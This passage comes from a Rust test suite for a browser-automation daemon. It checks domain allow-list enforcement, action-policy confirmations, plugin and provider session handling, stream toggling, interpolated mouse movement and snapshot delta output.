            crate::native::webdriver::client::WebDriverClient::new_with_session(
                port,
                "test-session".to_string(),
            ),
        ));
        let cmd = json!({
            "action": "read",
            "id": "read-active-tab-denied",
            "allowedDomains": ["example.com"]
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("evil.example"));
        assert!(error.contains("allowed domains"));
        assert_eq!(server.await.unwrap(), 1);
    }

    #[tokio::test]
    async fn test_read_without_url_uses_session_domain_filter_before_content() {
        let (port, server) = start_webdriver_response_server(vec![(
            "/session/test-session/url",
            json!({ "value": "https://evil.example/private" }),
        )])
        .await;
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }
        state.backend_type = BackendType::WebDriver;
        state.webdriver_backend = Some(WebDriverBackend::new(
            crate::native::webdriver::client::WebDriverClient::new_with_session(
                port,
                "test-session".to_string(),
            ),
        ));
        let cmd = json!({
            "action": "read",
            "id": "read-active-tab-denied"
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("evil.example"));
        assert!(error.contains("allowed domains"));
        assert_eq!(server.await.unwrap(), 1);
    }

    #[tokio::test]
    async fn test_read_without_url_allows_matching_active_tab() {
        let (port, server) = start_webdriver_response_server(vec![
            (
                "/session/test-session/url",
                json!({ "value": "https://example.com/app" }),
            ),
            (
                "/session/test-session/source",
                json!({ "value": "<html><body><h1>Account</h1><p>Signed in.</p></body></html>" }),
            ),
        ])
        .await;
        let mut state = DaemonState::new();
        state.backend_type = BackendType::WebDriver;
        state.webdriver_backend = Some(WebDriverBackend::new(
            crate::native::webdriver::client::WebDriverClient::new_with_session(
                port,
                "test-session".to_string(),
            ),
        ));
        let cmd = json!({
            "action": "read",
            "id": "read-active-tab-allowed",
            "allowedDomains": ["example.com"]
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], true);
        assert_eq!(resp["data"]["source"], "active-tab-html");
        let content = resp["data"]["content"].as_str().unwrap();
        assert!(content.contains("# Account"));
        assert!(content.contains("Signed in."));
        assert_eq!(server.await.unwrap(), 2);
    }

    #[tokio::test]
    async fn test_a_policy_change_drops_the_pending_confirmation() {
        let dir = tempfile::tempdir().unwrap();
        let confirm_read = dir.path().join("a.json");
        let deny_read = dir.path().join("b.json");
        fs::write(&confirm_read, r#"{"confirm":["read"]}"#).unwrap();
        fs::write(&deny_read, r#"{"deny":["read"]}"#).unwrap();
        let mut state = DaemonState::new();

        let parked = execute_command(
            &json!({
                "id": "parked",
                "action": "read",
                "url": "http://127.0.0.1:9/",
                "settings": { "action-policy": confirm_read.to_str().unwrap() }
            }),
            &mut state,
        )
        .await;
        assert_eq!(parked["data"]["confirmation_required"], true);
        assert!(state.pending_confirmation.is_some());

        // The operator switches to the stricter policy, riding on any command.
        let switched = execute_command(
            &json!({
                "id": "switch",
                "action": "state_list",
                "settings": { "action-policy": deny_read.to_str().unwrap() }
            }),
            &mut state,
        )
        .await;
        assert_eq!(switched["success"], true);
        assert!(state.pending_confirmation.is_none());

        let confirmed =
            execute_command(&json!({ "id": "confirm", "action": "confirm" }), &mut state).await;
        assert_eq!(confirmed["success"], false);
        assert!(state.policy.is_some());
        assert_eq!(
            state.settings.security().action_policy_path.as_deref(),
            deny_read.to_str()
        );
    }

    #[test]
    fn test_a_confirmation_replay_drops_only_the_policy_settings() {
        let replay = confirmation_replay_command(&json!({
            "action": "launch",
            "allowedDomains": ["a.example"],
            "settings": {
                "action-policy": "/tmp/a.json",
                "confirm-actions": "read",
                "allowed-domains": ["a.example"],
                "profile": "/tmp/p",
                "relaunch": true
            }
        }));
        assert_eq!(replay["allowedDomains"], json!(["a.example"]));
        assert_eq!(
            replay["settings"],
            json!({ "allowed-domains": ["a.example"], "profile": "/tmp/p", "relaunch": true })
        );

        let only_security = confirmation_replay_command(&json!({
            "action": "read",
            "settings": { "action-policy": "/tmp/a.json" }
        }));
        assert!(only_security.get("settings").is_none());
    }

    #[tokio::test]
    async fn test_a_confirmed_launch_keeps_the_allowed_domains_it_was_parked_with() {
        let (_env, mut state) = isolated_state();
        let dir = tempfile::tempdir().unwrap();
        let policy = dir.path().join("policy.json");
        fs::write(&policy, r#"{"confirm":["navigate"]}"#).unwrap();

        let parked = execute_command(
            &json!({
                "id": "parked",
                "action": "navigate",
                "url": "https://a.example",
                "settings": {
                    "action-policy": policy.to_str().unwrap(),
                    "allowed-domains": ["a.example"],
                    "executable-path": "/missing/chrome-for-test"
                }
            }),
            &mut state,
        )
        .await;
        assert_eq!(parked["data"]["confirmation_required"], true);
        assert!(
            state.domain_filter.read().await.is_none(),
            "deferred to the launch"
        );

        // The launch fails (no browser binary) after the settings apply.
        let _ = execute_command(&json!({ "id": "c", "action": "confirm" }), &mut state).await;

        assert_eq!(
            state.settings.security().allowed_domains,
            Some(vec!["a.example".to_string()])
        );
        assert!(state.domain_filter.read().await.is_some());
    }

    #[tokio::test]
    async fn test_confirm_rechecks_unapproved_plugin_action() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_PROVIDER"]);
        guard.remove("AGENT_BROWSER_PROVIDER");
        let dir = tempfile::tempdir().unwrap();
        let policy_path = dir.path().join("policy.json");
        fs::write(
            &policy_path,
            r#"{"confirm":["navigate","plugin:stealth:launch.mutate"]}"#,
        )
        .unwrap();

        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        let cmd = json!({
            "action": "navigate",
            "id": "policy-plugin-confirm",
            "url": "https://example.com",
            "plugins": [
                {
                    "name": "stealth",
                    "command": "agent-browser-plugin-stealth",
                    "capabilities": ["launch.mutate"]
                }
            ]
        });

        let first = execute_command(&cmd, &mut state).await;
        assert_eq!(first["data"]["confirmation_required"], true);
        assert_eq!(first["data"]["action"], "navigate");

        let second = execute_command(
            &json!({ "id": "policy-plugin-confirm-2", "action": "confirm" }),
            &mut state,
        )
        .await;

        assert_eq!(second["success"], true);
        assert_eq!(
            second["data"]["result"]["data"]["confirmation_required"],
            true
        );
        assert_eq!(
            second["data"]["result"]["data"]["action"],
            "plugin:stealth:launch.mutate"
        );
        let pending = state.pending_confirmation.as_ref().unwrap();
        assert_eq!(pending.action, "plugin:stealth:launch.mutate");
        assert!(pending.approved_actions.iter().any(|a| a == "navigate"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_auth_login_does_not_resolve_plugin_without_browser() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let marker_path = dir.path().join("credential-plugin-invoked");
        let plugin_path = dir.path().join("mock-credential-plugin");
        fs::write(
            &plugin_path,
            r#"#!/bin/sh
printf invoked > "$1"
cat >/dev/null
printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"credential":{"username":"user","password":"pass","url":"https://example.com/login"}}'
"#,
        )
        .unwrap();
        let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&plugin_path, perms).unwrap();

        let mut state = DaemonState::new();
        let cmd = json!({
            "id": "auth-plugin-no-browser",
            "action": "auth_login",
            "name": "example",
            "credentialProvider": "mock",
            "plugins": [
                {
                    "name": "mock",
                    "command": plugin_path.to_string_lossy(),
                    "args": [marker_path.to_string_lossy()],
                    "capabilities": ["credential.read"]
                }
            ]
        });

        let err = handle_auth_login(&cmd, &mut state).await.unwrap_err();

        assert_eq!(err, "Browser not launched");
        assert!(!marker_path.exists());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_auth_login_no_navigate_rejects_missing_page_before_plugin_resolution() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let marker_path = dir.path().join("credential-plugin-invoked");
        let plugin_path = dir.path().join("mock-credential-plugin");
        fs::write(
            &plugin_path,
            r#"#!/bin/sh
printf invoked > "$1"
cat >/dev/null
printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"credential":{"username":"user","password":"pass","url":"https://example.com/login"}}'
"#,
        )
        .unwrap();
        let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&plugin_path, perms).unwrap();

        let mut state = DaemonState::new();
        let cmd = json!({
            "id": "auth-plugin-no-page",
            "action": "auth_login",
            "name": "example",
            "noNavigate": true,
            "credentialProvider": "mock",
            "plugins": [
                {
                    "name": "mock",
                    "command": plugin_path.to_string_lossy(),
                    "args": [marker_path.to_string_lossy()],
                    "capabilities": ["credential.read"]
                }
            ]
        });

        let err = handle_auth_login(&cmd, &mut state).await.unwrap_err();

        assert_eq!(err, AUTH_LOGIN_NO_NAVIGATE_PAGE_ERROR);
        assert!(!marker_path.exists());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_close_current_browser_closes_active_provider_plugin_session() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let request_path = dir.path().join("browser-close-request.json");
        let plugin_path = dir.path().join("mock-provider-plugin");
        fs::write(
            &plugin_path,
            r#"#!/bin/sh
cat > "$1"
printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"data":{}}'
"#,
        )
        .unwrap();
        let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&plugin_path, perms).unwrap();

        let mut state = DaemonState::new();
        state.active_provider_connection = true;
        state.active_provider_session = Some(ActiveProviderSession {
            session: providers::ProviderSession {
                provider: "plugin:cloud-browser".to_string(),
                session_id: r#"{"sessionId":"s1"}"#.to_string(),
            },
            plugins: vec![crate::plugins::PluginConfig {
                name: "cloud-browser".to_string(),
                command: plugin_path.to_string_lossy().to_string(),
                args: vec![request_path.to_string_lossy().to_string()],
                capabilities: vec![crate::plugins::CAPABILITY_BROWSER_PROVIDER.to_string()],
                ..crate::plugins::PluginConfig::default()
            }],
        });

        close_current_browser(&mut state).await.unwrap();

        assert!(state.active_provider_session.is_none());
        assert!(!state.active_provider_connection);
        let request = fs::read_to_string(request_path).unwrap();
        assert!(request.contains(r#""type":"browser.close""#));
        assert!(request.contains(r#""sessionId":"s1""#));
    }

    fn pending_browser_use_session() -> ActiveProviderSession {
        ActiveProviderSession {
            session: providers::ProviderSession {
                provider: "browser-use".to_string(),
                session_id: "0e6ae5d0-93cf-4b9c-8c62-2c9c07b6c0f7".to_string(),
            },
            plugins: Vec::new(),
        }
    }

    #[tokio::test]
    async fn test_browser_use_failed_launches_restore_configuration() {
        let guard = EnvGuard::new(&[
            "BROWSER_USE_API_KEY",
            "AGENT_BROWSER_PROVIDER",
            "AGENT_BROWSER_PROXY_USERNAME",
            "AGENT_BROWSER_PROXY_PASSWORD",
        ]);
        guard.remove("BROWSER_USE_API_KEY");
        guard.remove("AGENT_BROWSER_PROVIDER");
        guard.set("AGENT_BROWSER_PROXY_USERNAME", "new-user");
        guard.set("AGENT_BROWSER_PROXY_PASSWORD", "new-password");
        for explicit in [true, false] {
            let mut state = DaemonState::new();
            state.settings.set(Key::Provider, json!("browser-use"));
            let credentials = Some(("old-user".to_string(), "old-password".to_string()));
            *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));
            *state.proxy_credentials.write().await = credentials.clone();
            state.plugin_init_scripts = vec!["previous-script".to_string()];
            state.session_setup.user_agent = Some("previous-agent".to_string());
            let result = if explicit {
                handle_launch(
                    &json!({"provider":"browser-use", "allowedDomains":[]}),
                    &mut state,
                )
                .await
            } else {
                auto_launch(&mut state, Vec::new()).await
            };
            assert!(result.is_err());
            assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
            assert_eq!(*state.proxy_credentials.read().await, credentials);
            assert_eq!(state.plugin_init_scripts, vec!["previous-script"]);
            assert_eq!(
                state.session_setup.user_agent.as_deref(),
                Some("previous-agent")
            );
        }
    }

    #[test]
    fn test_browser_use_canceled_setup_and_stop_preserve_state() {
        use std::io::Read;
        let vars = [
            "BROWSER_USE_API_KEY",
            "HTTPS_PROXY",
            "https_proxy",
            "ALL_PROXY",
            "all_proxy",
            "NO_PROXY",
            "no_proxy",
        ];
        let guard = EnvGuard::new(&vars);
        for name in vars {
            guard.remove(name);
        }
        guard.set("BROWSER_USE_API_KEY", "test-key");
        let rt = tokio::runtime::Runtime::new().unwrap();
        for closing in [false, true] {
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            guard.set(
                "HTTPS_PROXY",
                &format!("http://{}", listener.local_addr().unwrap()),
            );
            let server = std::thread::spawn(move || {
                let (mut stream, _) = listener.accept().unwrap();
                stream
                    .set_read_timeout(Some(std::time::Duration::from_secs(2)))
                    .unwrap();
                let mut bytes = [0; 1024];
                let count = stream.read(&mut bytes).unwrap();
                assert!(std::str::from_utf8(&bytes[..count])
                    .unwrap()
                    .starts_with("CONNECT "));
                std::thread::sleep(std::time::Duration::from_millis(700));
            });
            rt.block_on(async {
                let mut state = DaemonState::new();
                state.session_setup.user_agent = Some("previous-agent".to_string());
                *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));
                let deadline = std::time::Duration::from_millis(200);
                if closing {
                    state.active_provider_session = Some(pending_browser_use_session());
                    state.active_provider_connection = true;
                    state.launch_identity = Some(42);
                    state.screencasting = true;
                    state.network_auto_attach_installed = true;
                    assert!(
                        tokio::time::timeout(deadline, close_current_browser(&mut state))
                            .await
                            .is_err()
                    );
                    assert_eq!(
                        state
                            .active_provider_session
                            .as_ref()
                            .unwrap()
                            .session
                            .session_id,
                        pending_browser_use_session().session.session_id
                    );
                    assert!(state.active_provider_connection);
                    assert_eq!(state.launch_identity, None);
                    assert!(!state.screencasting && !state.network_auto_attach_installed);
                } else {
                    let result = handle_launch_with_deadline(
                        &json!({"provider":"browser-use", "allowedDomains":[]}),
                        &mut state,
                        deadline,
                    )
                    .await;
                    assert!(result.unwrap_err().contains("setup timed out"));
                }
                assert_eq!(
                    state.session_setup.user_agent.as_deref(),
                    Some("previous-agent")
                );
                assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
            });
            server.join().unwrap();
        }
    }

    #[tokio::test]
    async fn test_browser_use_cdp_failure_retains_ownership_without_exposing_credentials() {
        for endpoint in [
            "",
            "file:///secret",
            "ws://127.0.0.1:1/secret?apiKey=do-not-echo",
        ] {
            let mut state = DaemonState::new();
            let session = pending_browser_use_session().session;
            let conn = providers::ProviderConnection {
                ws_url: endpoint.to_string(),
                session: Some(session.clone()),
                direct_page: false,
                metadata: None,
            };
            let error = attach_provider_cdp("browser-use", &conn, None, &mut state, &[])
                .await
                .err()
                .unwrap();
            assert!(error.starts_with("Browser Use"));
            assert!(!error.contains("secret") && !error.contains("do-not-echo"));
            let active = state.active_provider_session.as_ref().unwrap();
            assert_eq!(active.session.session_id, session.session_id);
        }
    }

    #[tokio::test]
    async fn test_browser_use_failed_close_retains_id_and_blocks_replacement() {
        let guard = EnvGuard::new(&["BROWSER_USE_API_KEY", "AGENT_BROWSER_PROVIDER"]);
        guard.remove("BROWSER_USE_API_KEY");
        guard.remove("AGENT_BROWSER_PROVIDER");
        let mut state = DaemonState::new();
        state.active_provider_connection = true;
        state.active_provider_session = Some(pending_browser_use_session());
        for action in ["close", "close", "launch"] {
            let response =
                execute_command(&json!({"action":action,"id":"retry"}), &mut state).await;
            assert_eq!(response["success"], false);
            assert!(response["error"]
                .as_str()
                .unwrap()
                .contains(&pending_browser_use_session().session.session_id));
            assert_eq!(
                state
                    .active_provider_session
                    .as_ref()
                    .unwrap()
                    .session
                    .session_id,
                pending_browser_use_session().session.session_id
            );
            assert!(state.active_provider_connection && state.browser.is_none());
        }
    }

    #[tokio::test]
    #[ignore = "requires Chrome"]
    async fn e2e_browser_use_owned_connection_preserves_plain_command_state() {
        let mut producer = BrowserManager::launch(LaunchOptions::default(), None)
            .await
            .unwrap();
        let mut state = DaemonState::new();
        state.browser = Some(
            BrowserManager::connect_cdp(producer.get_cdp_url())
                .await
                .unwrap(),
        );
        state.active_provider_session = Some(pending_browser_use_session());
        state.active_provider_connection = true;
        let target = state
            .browser
            .as_ref()
            .unwrap()
            .active_target_id()
            .unwrap()
            .to_string();
        for script in [
            "window.__providerSentinel = 'kept'",
            "window.__providerSentinel",
        ] {
            let response = execute_command(
                &json!({"id":"continuity", "action":"evaluate", "script":script}),
                &mut state,
            )
            .await;
            assert_eq!(response["success"], true);
            assert_eq!(response["data"]["result"], "kept");
            assert_eq!(
                state.browser.as_ref().unwrap().active_target_id().unwrap(),
                target
            );
        }
        assert!(state.active_provider_session.is_some());
        state.active_provider_session = None;
        close_current_browser(&mut state).await.unwrap();
        assert!(producer.is_connection_alive().await);
        producer.close().await.unwrap();
    }

    #[test]
    fn test_provider_owned_cdp_connection_remains_idle_cleanup_eligible() {
        assert!(
            !default_idle_shutdown_is_blocked(false, true, true),
            "provider ownership must override the attached-CDP exemption"
        );
        assert!(default_idle_shutdown_is_blocked(false, false, true));
        assert!(default_idle_shutdown_is_blocked(true, true, false));
    }

    #[test]
    fn test_provider_ownership_does_not_require_cleanup_metadata() {
        let mut state = DaemonState::new();

        remember_active_provider_session(&mut state, None, &[]);

        assert!(state.active_provider_connection);
        assert!(state.active_provider_session.is_none());
    }

    #[tokio::test]
    async fn test_close_current_browser_clears_iframe_sessions() {
        let mut state = DaemonState::new();
        state
            .iframe_sessions
            .insert("frame-1".to_string(), "session-1".to_string());
        state.active_iframe_sessions.insert("session-1".to_string());

        close_current_browser(&mut state).await.unwrap();

        assert!(state.iframe_sessions.is_empty());
        assert!(state.active_iframe_sessions.is_empty());
    }

    #[tokio::test]
    async fn test_stream_enable_disable_and_status_without_browser() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_SESSION"]);
        let socket_dir = unique_socket_dir("stream-runtime");
        fs::create_dir_all(&socket_dir).expect("socket dir should be created");
        guard.set(
            "AGENT_BROWSER_SOCKET_DIR",
            socket_dir.to_str().expect("socket dir should be utf-8"),
        );
        guard.set("AGENT_BROWSER_SESSION", "stream-runtime-session");

        let mut state = DaemonState::new();

        let disabled_status = handle_stream_status(&state)
            .await
            .expect("status should work before enable");
        assert_eq!(disabled_status["enabled"], false);
        assert_eq!(disabled_status["port"], Value::Null);
        assert_eq!(disabled_status["connected"], false);
        assert_eq!(disabled_status["screencasting"], false);

        let enabled_status = handle_stream_enable(&json!({ "port": 0 }), &mut state)
            .await
            .expect("stream enable should succeed");
        let port = enabled_status["port"]
            .as_u64()
            .expect("runtime stream should report a bound port");
        assert!(port > 0, "runtime stream should bind a non-zero port");
        assert_eq!(enabled_status["enabled"], true);
        assert_eq!(enabled_status["connected"], false);
        assert_eq!(enabled_status["screencasting"], false);

        let stream_path = socket_dir.join("stream-runtime-session.stream");
        let port_file =
            fs::read_to_string(&stream_path).expect("stream metadata file should exist");
        assert_eq!(port_file.trim(), port.to_string());

        let duplicate_err = handle_stream_enable(&json!({}), &mut state)
            .await
            .expect_err("duplicate enable should fail");
        assert!(duplicate_err.contains("already enabled"));

        let status = handle_stream_status(&state)
            .await
            .expect("status should work after enable");
        assert_eq!(status["enabled"], true);
        assert_eq!(status["port"], port);

        let disabled = handle_stream_disable(&mut state)
            .await
            .expect("stream disable should succeed");
        assert_eq!(disabled["disabled"], true);
        assert!(
            !stream_path.exists(),
            "disabling runtime stream should remove the metadata file"
        );
        assert!(state.stream_server.is_none());
        assert!(state.stream_client.is_none());

        let final_status = handle_stream_status(&state)
            .await
            .expect("status should work after disable");
        assert_eq!(final_status["enabled"], false);
        assert_eq!(final_status["port"], Value::Null);

        let disable_err = handle_stream_disable(&mut state)
            .await
            .expect_err("duplicate disable should fail");
        assert!(disable_err.contains("not enabled"));

        let _ = fs::remove_dir_all(&socket_dir);
    }

    #[tokio::test]
    async fn test_stream_disable_preserves_existing_screencast_state() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_SESSION"]);
        let socket_dir = unique_socket_dir("stream-preserve-screencast");
        fs::create_dir_all(&socket_dir).expect("socket dir should be created");
        guard.set(
            "AGENT_BROWSER_SOCKET_DIR",
            socket_dir.to_str().expect("socket dir should be utf-8"),
        );
        guard.set(
            "AGENT_BROWSER_SESSION",
            "stream-preserve-screencast-session",
        );

        let mut state = DaemonState::new();
        handle_stream_enable(&json!({ "port": 0 }), &mut state)
            .await
            .expect("stream enable should succeed");
        state.screencasting = true;

        let disabled = handle_stream_disable(&mut state)
            .await
            .expect("stream disable should succeed");
        assert_eq!(disabled["disabled"], true);
        assert!(
            state.screencasting,
            "stream disable should not clear an independently managed screencast state"
        );

        let _ = fs::remove_dir_all(&socket_dir);
    }

    #[tokio::test]
    async fn test_stream_disable_clears_state_when_stream_file_removal_fails() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_SESSION"]);
        let socket_dir = unique_socket_dir("stream-disable-cleanup");
        fs::create_dir_all(&socket_dir).expect("socket dir should be created");
        guard.set(
            "AGENT_BROWSER_SOCKET_DIR",
            socket_dir.to_str().expect("socket dir should be utf-8"),
        );
        guard.set("AGENT_BROWSER_SESSION", "stream-disable-cleanup-session");

        let mut state = DaemonState::new();
        handle_stream_enable(&json!({ "port": 0 }), &mut state)
            .await
            .expect("stream enable should succeed");

        let stream_path = socket_dir.join("stream-disable-cleanup-session.stream");
        fs::remove_file(&stream_path).expect("stream metadata file should exist");
        fs::create_dir(&stream_path).expect("directory should force remove_stream_file failure");

        let err = handle_stream_disable(&mut state)
            .await
            .expect_err("stream disable should surface file removal failure");
        assert!(err.contains("Failed to remove stream metadata"));
        assert!(
            state.stream_server.is_none(),
            "stream disable should clear stream_server even when metadata cleanup fails"
        );
        assert!(
            state.stream_client.is_none(),
            "stream disable should clear stream_client even when metadata cleanup fails"
        );

        let _ = fs::remove_dir_all(&socket_dir);
    }

    #[tokio::test]
    async fn test_stream_enable_port_conflict_returns_error() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_SOCKET_DIR", "AGENT_BROWSER_SESSION"]);
        let socket_dir = unique_socket_dir("stream-port-conflict");
        fs::create_dir_all(&socket_dir).expect("socket dir should be created");
        guard.set(
            "AGENT_BROWSER_SOCKET_DIR",
            socket_dir.to_str().expect("socket dir should be utf-8"),
        );
        guard.set("AGENT_BROWSER_SESSION", "stream-port-conflict-session");

        let listener = std::net::TcpListener::bind("127.0.0.1:0")
            .expect("test should reserve an ephemeral port");
        let port = listener
            .local_addr()
            .expect("listener should have local addr")
            .port();

        let mut state = DaemonState::new();
        let err = handle_stream_enable(&json!({ "port": port }), &mut state)
            .await
            .expect_err("conflicting port should fail");
        assert!(err.contains("Failed to bind stream server"));
        assert!(state.stream_server.is_none());
        assert!(state.stream_client.is_none());
        assert!(
            !socket_dir
                .join("stream-port-conflict-session.stream")
                .exists(),
            "failed enable should not leave stale metadata behind"
        );

        drop(listener);
        let _ = fs::remove_dir_all(&socket_dir);
    }

    #[test]
    fn interpolated_mouse_path_uses_easing_and_exact_endpoint() {
        let midpoint = interpolated_mouse_point(0.0, 0.0, 100.0, 0.0, 0.0, 1.0, 10.0, 1, 2);
        assert_eq!(midpoint, (50.0, 10.0));
        let endpoint = interpolated_mouse_point(0.0, 0.0, 100.0, 0.0, 0.0, 1.0, 10.0, 2, 2);
        assert_eq!(endpoint, (100.0, 0.0));
    }

    #[test]
    fn human_mouse_path_samples_short_moves_at_animation_cadence() {
        assert_eq!(interpolated_mouse_steps(10.0, 100, None, true), 7);
        assert_eq!(interpolated_mouse_steps(10.0, 100, None, false), 1);
        assert_eq!(interpolated_mouse_steps(10.0, 100, Some(3), true), 3);
    }

    #[tokio::test]
    async fn mouse_move_duration_includes_cdp_response_latency() {
        use futures_util::{SinkExt, StreamExt};
        use std::time::Duration;
        use tokio_tungstenite::tungstenite::Message;

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("ws://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
            let mut positions = Vec::new();
            for _ in 0..4 {
                let message = ws.next().await.unwrap().unwrap().into_text().unwrap();
                let command: Value = serde_json::from_str(&message).unwrap();
                assert_eq!(command["method"], "Input.dispatchMouseEvent");
                assert_eq!(command["params"]["buttons"], 1);
                positions.push((
                    command["params"]["x"].as_f64().unwrap(),
                    command["params"]["y"].as_f64().unwrap(),
                ));
                tokio::time::sleep(Duration::from_millis(200)).await;
                ws.send(Message::Text(
                    json!({ "id": command["id"], "result": {} }).to_string(),
                ))
                .await
                .unwrap();
            }
            positions
        });
        let client = CdpClient::connect(&url).await.unwrap();
        let mut mouse = MouseState::default();
        let history = Arc::new(std::sync::Mutex::new(
            recording::RecordingCursorHistory::default(),
        ));
        let started = tokio::time::Instant::now();
        move_mouse_interpolated(
            &client,
            "page",
            &mut mouse,
            400.0,
            200.0,
            1000,
            Some(4),
            true,
            42,
            1,
            (0.0, 0.0),
            &history,
        )
        .await
        .unwrap();
        let elapsed = started.elapsed();
        assert!(elapsed >= Duration::from_millis(1000));
        assert!(
            elapsed < Duration::from_millis(1600),
            "response latency was added to the movement duration: {elapsed:?}"
        );
        let positions = server.await.unwrap();
        assert_eq!(positions.last(), Some(&(400.0, 200.0)));
        assert_eq!((mouse.x, mouse.y), (400.0, 200.0));
    }

    #[test]
    fn snapshot_delta_tree_splice_preserves_changes_missing_from_ref_metadata() {
        let padding = "- button \"Unchanged\" [ref=e99]\n".repeat(40);
        let before = format!("{padding}- button \"Save\" [ref=e1]\n- checkbox \"Agree\" [ref=e2]");
        let after = format!(
            "{padding}- button \"Saved\" [ref=e1]\n- checkbox \"Agree\" [ref=e2] [checked]"
        );
        let previous = SnapshotRevision {
            revision: 1, url: "about:blank".into(), options: "{}".into(), tree: before.clone(),
            refs: serde_json::from_value(json!({"e1": {"role": "button", "name": "Save"}, "e2": {"role": "checkbox", "name": "Agree"}})).unwrap(),
        };
        let mut refs = previous.refs.clone();
        refs["e1"]["name"] = json!("Saved");
        for current in [after, before.replace("[ref=e2]", "[ref=e2] [checked]")] {
            let result = snapshot_delta_response(&previous, 2, &current, &refs, &previous.url);
            assert_eq!(result["snapshot"]["kind"], "delta");
            let patch = &result["snapshot"]["treeChange"];
            let start = patch["startLine"].as_u64().unwrap() as usize;
            let count = patch["deleteCount"].as_u64().unwrap() as usize;
            let mut reconstructed: Vec<&str> = before.split('\n').collect();
            reconstructed.splice(
                start..start + count,
                patch["lines"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .map(|v| v.as_str().unwrap()),
            );
            assert_eq!(reconstructed.join("\n"), current);
        }
    }

    #[test]
    fn test_snapshot_delta_unchanged_is_tiny() {
        let previous = SnapshotRevision {
            revision: 4,
            url: "https://example.com".to_string(),
            options: "{}".to_string(),
            tree: "- button \"Save\" [ref=e1]".to_string(),
            refs: serde_json::from_value(json!({"e1": {"role": "button", "name": "Save"}}))
                .unwrap(),
        };
        let result =
            snapshot_delta_response(&previous, 5, &previous.tree, &previous.refs, &previous.url);
        assert_eq!(result["snapshot"]["kind"], "unchanged");
        assert_eq!(result["snapshot"]["baseRevision"], 4);
        assert!(result["snapshot"].get("tree").is_none());
    }

    #[test]
    fn test_snapshot_delta_reports_replacements_and_removals() {
        let previous = SnapshotRevision {
            revision: 1,
            url: "https://example.com".to_string(),
            options: "{}".to_string(),
            tree: format!("{}\nold", "x".repeat(1000)),
            refs: serde_json::from_value(json!({
                "e1": {"role": "button", "name": "Save"},
                "e2": {"role": "alert", "name": "Old"}
            }))
            .unwrap(),
        };
        let refs = serde_json::from_value(json!({
            "e1": {"role": "button", "name": "Saved"},
            "e3": {"role": "status", "name": "Done"}
        }))
        .unwrap();
        let result = snapshot_delta_response(
            &previous,
            2,
            &format!("{}\nnew", "x".repeat(1000)),
            &refs,
            &previous.url,
        );
        assert_eq!(result["snapshot"]["kind"], "delta");
        let changes = result["snapshot"]["changes"].as_array().unwrap();
        assert!(changes
            .iter()
            .any(|change| change["op"] == "replace" && change["ref"] == "@e1"));
        assert!(changes
            .iter()
            .any(|change| change["op"] == "remove" && change["ref"] == "@e2"));
        assert!(changes
            .iter()
            .any(|change| change["op"] == "add" && change["ref"] == "@e3"));
    }

    #[test]
    fn test_success_response_structure() {
        let resp = success_response("cmd-1", json!({"url": "https://example.com"}));
        assert_eq!(resp["id"], "cmd-1");
        assert_eq!(resp["success"], true);
        assert!(resp["data"].is_object());
        assert_eq!(resp["data"]["url"], "https://example.com");
    }

    fn webmcp_tool(name: &str, origin: &str) -> webmcp::ToolRecord {
        webmcp::ToolRecord {
            name: name.to_string(),
            description: String::new(),
            input_schema: json!({}),
            annotations: json!({}),
            origin: origin.to_string(),
            frame_id: "frame-1".to_string(),
            backend_node_id: None,
        }
    }

    #[test]
    fn test_browser_responses_include_current_webmcp_tools() {
        let tools = vec![webmcp_tool("search", "https://example.com")];
        for action in [
            "launch",
            "navigate",
            "click",
            "fill",
            "snapshot",
            "evaluate",
            "wait",
            "back",
            "reload",
            "tab_new",
            "tab_switch",
            "webmcp_invoke",
            "webmcp_result",
        ] {
            let mut resp = success_response("cmd", json!({"text": "unchanged"}));
            attach_webmcp_availability_from_tools(
                &mut resp,
                action,
                &tools,
                None,
                &mut webmcp::RuntimeState::default(),
                "session",
            );
            assert_eq!(resp["data"]["webmcp"]["toolCount"], 1, "{action}");
            assert_eq!(
                resp["data"]["webmcp"]["tools"][0]["name"], "search",
                "{action}"
            );
            assert!(resp["data"]["webmcp"]["tools"][0]
                .get("inputSchema")
                .is_none());
            assert_eq!(resp["data"]["text"], "unchanged");
